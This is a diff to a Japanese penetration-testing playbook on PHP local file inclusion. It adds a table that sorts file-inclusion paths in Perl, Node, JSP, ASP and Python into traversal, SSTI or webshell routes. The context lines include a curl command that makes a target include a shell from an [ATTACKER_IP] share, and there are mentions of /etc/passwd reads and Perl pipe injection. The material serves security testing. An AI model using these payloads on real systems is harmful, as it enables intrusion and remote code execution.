@@ -7,7 +7,7 @@
 - `?page=` / `?file=` / `?lang=` / `?template=` / `?include=` / `?view=` 等、**ページ名・ファイル名を受け取るパラメータ**がある
 - そのパラメータ値が `include()` / `require()` / `include_once()` 系に渡っている疑い（値を変えるとページ全体の見た目が切り替わる・末尾に拡張子が補完される 404 メッセージが出る 等）
 - `Path_Traversal.md` の手法で `/etc/passwd` 等は**読めたが**、PHP ファイルを指定するとソースが表示されず**実行されてしまう** → read ではなく include sink。LFI コンテキスト確定
-- PHP 以外（JSP / ASP / Perl / Node の動的 `require`）でも include 不備は起きるが、**wrapper・log poisoning 等の RCE 道具が最も揃うのは PHP**。本ファイルは PHP を主対象に書く
+- PHP 以外（JSP / ASP / Perl / Node の動的 `require`）でも include 不備は起きるが、**wrapper・log poisoning 等の RCE 道具が最も揃うのは PHP**。本ファイルは PHP を主対象に書く。**標的が PHP でない場合は末尾「他言語での file inclusion（PHP 以外）」で行き先を確認してから進む**
 
 ## 環境前提
 - 実行環境: テスター端末
@@ -283,6 +283,30 @@ curl -s "http://[TARGET]/index.php?page=\\\\[ATTACKER_IP]\\share\\shell.php"
 - log / session poisoning は**サーバに痕跡が残る**。実環境では汚染したログ行・セッションを原状回復対象として記録する
 - filter chain 文字列は長大で `&`/`=` を含む → **URL エンコード必須**。GET 長制限に当たるなら POST 化
 - **§2 のソース／設定ファイル開示は実行を伴わず痕跡を残さない**。§3〜§6 の RCE 昇格に進む前に、ここで include の sink・認証情報を固めておくと無駄撃ちが減る
+
+---
+
+## 他言語での file inclusion（PHP 以外）
+
+LFI を「取り込んだファイルが**実行される**」脆弱性と捉えると、それがそのまま成立するのは **PHP の `include`/`require` が拡張子を問わず中身を PHP として実行する**仕様による。他言語は等価物が別カテゴリに散る（読み取り＝traversal / テンプレート実行＝SSTI / アップロード設置＝webshell）ため、本ファイルは PHP を主対象とし、ここでは**行き先だけ**を示す。フル PoC は各リンク先に置く。
+
+| 言語/環境 | 取り込み機構 | 既定の帰結 | RCE 化の道筋 / 行き先 |
+|---|---|---|---|
+| **PHP** | `include` / `require` / `include_once` | **RCE** | 拡張子無視で実行（§1〜§8 が本題）|
+| **Perl / CGI** | `require` / `do`、2 引数 `open` | RCE あり | `require $input` で Perl 実行。`open(FH, $input)` で先頭 `\|` を渡すとコマンド注入（古典 CGI）|
+| **Node.js** | 動的 `require()`、`res.render(view名)` | 条件付き RCE | アップロードした `.js` を `require` させ実行。テンプレートエンジン経由は SSTI 側（`SSTI.md`）|
+| **JSP / Java** | `<%@include%>`（静的）、`<jsp:include>`、JSTL `<c:import url>` | 多くは read / SSRF | include 先は基本 webapp 内。`c:import` の `url` は外部 fetch ＝ SSRF/RFI 的（`SSRF.md`）。RCE は別途 `.jsp` 設置や deserialization 経由 |
+| **ASP classic** | `<!--#include file/virtual-->`（SSI）| read 寄り | 動的なユーザー指定は限定的 |
+| **ASP.NET** | 動的な「入力をコードとして include」は稀 | read | `Server.MapPath` / traversal の file read が中心（`Path_Traversal.md`）|
+| **Python** | `importlib` 等が user 制御になるのは稀 | read | traversal で read。RCE はテンプレート（SSTI）/ pickle 等の別経路 |
+
+**行き先の振り分け（言語共通）:**
+
+- 取り込んだファイルが**実行されず中身が見えるだけ** → パストラバーサル（`Path_Traversal.md`）
+- **テンプレートエンジン**に式・テンプレート名が渡って評価される → SSTI（`SSTI.md`）
+- アップロードしたファイルを **web root に設置して実行**（言語問わず webshell）→ `File_Upload.md` / `Web_Shells.md`
+
+> この表は確立した文書からの引用ではなく分類としての整理。**PHP 以外で「include 実行」がフル威力で出るのは実質 Perl と Node 程度**で、JSP / .NET / Python は read（traversal）か SSTI に流れる、という経験則ベースの地図として使う。
 
 ---
 
